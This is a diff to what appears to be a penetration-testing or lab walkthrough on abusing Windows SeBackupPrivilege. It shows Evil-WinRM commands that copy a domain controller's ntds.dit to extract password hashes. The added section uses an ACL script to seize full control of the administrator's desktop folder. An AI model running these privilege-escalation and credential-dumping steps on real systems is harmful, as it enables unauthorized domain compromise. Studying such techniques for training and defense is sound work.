@@ -154,3 +154,9 @@ Now we can use **Copy-FileSeBackupPrivilege** to copy files from our Shadow driv
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege w:\Windows\NTDS\ntds.dit C:\Users\svc_backup\Documents\ntds.dit
 ```
 > NOTE: In the case of a DC, the privilege only allows you to make **BACKUPS NOT COPIES**. In a standalone system, we can make copies of the files (SAM and SYSTEM hive). In the case of DC, the method differs as now we need to make backups of the **NTDS.dit** and **SYSTEM** files to extract the password hash of users.
+## Additional
+There is another way that still involves the **SeBackupPrivilege** and **SeRestorePrivilege**. It’s to modify **ACL** and grant myself *full access* to the file/folder I specified using [this PowerShell script](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1). In the following, I use that script to own the entire admin’s desktop folder.
+```console
+*Evil-WinRM* PS C:\Users\svc-printer\chrp>Import-Module .\Acl-FullControl.ps1
+*Evil-WinRM* PS C:\Users\svc-printer\chrp>Acl-FullControl -user return\svc-printer -path c:\users\administrator\desktop
+```
